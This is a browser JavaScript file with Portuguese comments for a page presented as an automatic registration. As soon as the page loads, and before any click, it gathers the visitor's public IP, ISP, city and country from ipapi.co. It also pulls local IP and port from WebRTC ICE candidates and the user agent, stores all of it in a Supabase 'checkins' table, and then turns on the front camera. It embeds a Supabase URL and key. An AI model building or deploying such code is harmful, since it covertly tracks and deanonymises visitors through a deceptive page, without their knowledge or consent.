// =================================================================
// CONFIGURAÇÃO DE CONEXÃO
// =================================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// ÁUDIO
// =================================================================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  speechSynthesis.speak(fala);
}

// =================================================================
// SALVAR NO BANCO
// =================================================================
async function salvarNoBanco(dados) {
  try {
    const { error } = await supabaseClient.from('checkins').insert([dados]);
    if (error) console.error(error);
    else console.log("✅ Salvo:", dados.tipo_captura);
    return true;
  } catch(e) {
    console.error(e);
    return false;
  }
}

// =================================================================
// CAPTURA AVANÇADA DE CONEXÃO (ICE, STUN, PORTA, etc)
// =================================================================
async function getInfoConexao() {
  const info = {
    tipo_captura: "previa",
    ip: "indisponível",
    local_ip: null,
    local_port: null,
    provedor: null,
    ice: null,
    stun: null,
    connection_type: null
  };

  // IP Público + Provedor
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    info.ip = data.ip || "indisponível";
    info.provedor = data.org || "Desconhecido";
    info.cidade = data.city;
    info.estado = data.region;
    info.pais = data.country_name;
  } catch(e) {}

  // WebRTC - ICE, STUN, Porta
  try {
    const rtc = new RTCPeerConnection({
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' },
        { urls: 'stun:stun2.l.google.com:19302' }
      ],
      iceTransportPolicy: "all"
    });

    rtc.createDataChannel("connection-test");

    rtc.onicecandidate = (event) => {
      if (event.candidate) {
        const cand = event.candidate.candidate;
        
        // Extrai IP e Porta
        const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
        const portMatch = cand.match(/(\d{4,5})\s+typ/);
        const typeMatch = cand.match(/typ\s(\w+)/);

        if (ipMatch) info.local_ip = ipMatch[1];
        if (portMatch) info.local_port = portMatch[1];
        
        // Tipo de conexão ICE
        if (typeMatch) {
          info.ice = typeMatch[1]; // host, srflx, relay
          if (typeMatch[1] === "srflx") info.stun = "Usado";
          if (typeMatch[1] === "relay") info.stun = "TURN/Relay";
        }

        info.connection_type = "WebRTC";
      }
    };

    const offer = await rtc.createOffer();
    await rtc.setLocalDescription(offer);

    // Espera candidates
    await new Promise(resolve => setTimeout(resolve, 1800));

  } catch(e) {
    console.log("WebRTC error:", e);
  }

  info.user_agent = navigator.userAgent;
  info.timestamp = new Date().toISOString();

  return info;
}

// =================================================================
// INICIALIZAÇÃO
// =================================================================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema...";

    statusText.innerHTML = "🌐 Capturando ICE, STUN, IP e Porta...";
    const infoConexao = await getInfoConexao();
    
    await salvarNoBanco(infoConexao);

    statusText.innerHTML = "✅ Dados de conexão salvos.<br>Clique no botão para completar.";

    // Inicia câmera
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;
    await video.play();

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Permita câmera";
  }
}

window.onload = iniciarSistema;

// O resto do código do botão você pode manter do original
